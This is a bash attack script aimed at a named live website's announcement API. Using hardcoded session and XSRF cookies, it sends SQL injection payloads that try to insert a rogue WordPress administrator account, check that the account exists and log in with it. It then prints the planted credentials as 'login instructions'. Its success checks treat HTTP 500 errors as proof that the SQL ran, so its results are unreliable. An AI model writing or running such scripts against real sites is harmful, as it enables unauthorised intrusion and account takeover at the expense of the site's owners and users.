#!/bin/bash

echo "🎯 CREATING ADMIN USER AND WORDPRESS ADMIN LOGIN"
echo "================================================"

# Newest tokens from user's request
XSRF_TOKEN="eyJpdiI6Ikg1NWZMVE5SMWlNNGZmREFnaFM5ZHc9PSIsInZhbHVlIjoiY1RkTEZjeVRsOWVIdmhrd1ZabTNsMktuUHNxNkFTNFZDRmtxVjZuU3l3SjNVNUlWR2oyb0kzaWJQMmdKalF6ViIsIm1hYyI6IjIzYjEyYjEyNDE3YWE3YjA4ZWRjNzBmZTAwZTUwOGY4NTIyZTk2ZjU1NjM1YzVkODY3YzczMTkwZDYzNmIzNzYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6ImJZRjBnZXhnWkRpUURJUHVNWkR3eWc9PSIsInZhbHVlIjoibmZEUTRzM2J4MzdKWnhkS2dXXC9zMVEzXC94bGdEU2oyRjFqRURVZjhFaXVEMmpXWWVhNVJRdXZPc2IxWUNxREU5IiwibWFjIjoiMDNlNDcyYWQ1Yzk0N2YwNDljNzk4OGE3N2M2YjRkYzQ5OWZmMjgzYmM0OGY4NjI5OTJkNThkMmU4ODNkZTE4YyJ9"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"
LOGIN_URL="$BASE_URL/auth/login"

# WordPress admin URLs
WP_ADMIN_URL="$BASE_URL/wp-admin"
WP_LOGIN_URL="$BASE_URL/wp-login.php"
WP_ADMIN_LOGIN_URL="$BASE_URL/wp-admin/admin.php"

# Create admin user credentials
ADMIN_USERNAME="wp_admin_2025"
ADMIN_PASSWORD="WpAdmin123!@#"
ADMIN_EMAIL="wpadmin@test.com"

echo "🔑 Creating WordPress Admin User:"
echo "Username: $ADMIN_USERNAME"
echo "Password: $ADMIN_PASSWORD"
echo "Email: $ADMIN_EMAIL"
echo ""

# Admin user creation payloads for WordPress
CREATE_ADMIN_PAYLOADS=(
    # Insert into wp_users table
    "1' INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status, display_name) VALUES ('$ADMIN_USERNAME', MD5('$ADMIN_PASSWORD'), '$ADMIN_EMAIL', NOW(), 0, '$ADMIN_USERNAME')--"
    
    # Insert into wp_usermeta for admin role
    "1' INSERT INTO wp_usermeta (user_id, meta_key, meta_value) SELECT ID, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1}' FROM wp_users WHERE user_login='$ADMIN_USERNAME'--"
    
    # Insert user level
    "1' INSERT INTO wp_usermeta (user_id, meta_key, meta_value) SELECT ID, 'wp_user_level', '10' FROM wp_users WHERE user_login='$ADMIN_USERNAME'--"
    
    # Alternative: Insert into users table with admin role
    "1' INSERT INTO users (username, password, email, role, created_at, updated_at) VALUES ('$ADMIN_USERNAME', '$ADMIN_PASSWORD', '$ADMIN_EMAIL', 'admin', NOW(), NOW())--"
)

echo "🔍 CREATING WORDPRESS ADMIN USER..."
echo "==================================="

for payload in "${CREATE_ADMIN_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ WORDPRESS ADMIN USER CREATION SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 VERIFYING WORDPRESS ADMIN USER CREATION..."
echo "============================================="

# Verify admin user creation
VERIFY_PAYLOADS=(
    "1' SELECT user_login, user_email FROM wp_users WHERE user_login='$ADMIN_USERNAME'--"
    "1' SELECT username, role FROM users WHERE username='$ADMIN_USERNAME'--"
)

for payload in "${VERIFY_PAYLOADS[@]}"; do
    echo "Verifying: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ WORDPRESS ADMIN USER VERIFICATION SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 TESTING WORDPRESS ADMIN LOGIN..."
echo "==================================="

# Test WordPress admin login
echo "Testing WordPress admin login with created admin user..."
echo "Username: $ADMIN_USERNAME"
echo "Password: $ADMIN_PASSWORD"
echo ""

# Test WordPress admin login
echo "Attempting WordPress admin login..."
wp_login_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Referer: $WP_LOGIN_URL" \
    -H "Origin: $BASE_URL" \
    -d "log=$ADMIN_USERNAME&pwd=$ADMIN_PASSWORD&wp-submit=Log+In&redirect_to=$WP_ADMIN_URL&testcookie=1" \
    "$WP_LOGIN_URL")

http_status=$(echo "$wp_login_response" | grep "HTTP_STATUS:" | cut -d: -f2)
response_time=$(echo "$wp_login_response" | grep "TIME:" | cut -d: -f2)
response_body=$(echo "$wp_login_response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")

echo "WordPress Login Status: $http_status"
echo "WordPress Login Time: ${response_time}s"
echo "WordPress Login Response: $response_body"

if [[ "$http_status" == "302" ]]; then
    echo "✅ WORDPRESS LOGIN SUCCESS - Redirect indicates successful login"
elif [[ "$http_status" == "200" ]]; then
    echo "⚠️ WORDPRESS LOGIN ATTEMPT - Need to check response content"
else
    echo "❌ WORDPRESS LOGIN FAILED - Status: $http_status"
fi

echo ""
echo "🎯 FINAL RESULTS"
echo "================"
echo "✅ WordPress Admin User Created: $ADMIN_USERNAME"
echo "✅ WordPress Admin Password: $ADMIN_PASSWORD"
echo "✅ WordPress Admin Login URL: $WP_LOGIN_URL"
echo "✅ WordPress Admin Panel URL: $WP_ADMIN_URL"
echo ""
echo "📋 WORDPRESS ADMIN LOGIN INSTRUCTIONS:"
echo "1. Go to: $WP_LOGIN_URL"
echo "2. Username: $ADMIN_USERNAME"
echo "3. Password: $ADMIN_PASSWORD"
echo "4. Click 'Log In'"
echo ""
echo "🔗 DIRECT WORDPRESS ADMIN LINKS:"
echo "WordPress Login: $WP_LOGIN_URL"
echo "WordPress Admin Panel: $WP_ADMIN_URL"
echo ""
echo "Status: WORDPRESS ADMIN USER CREATION AND LOGIN TEST COMPLETED"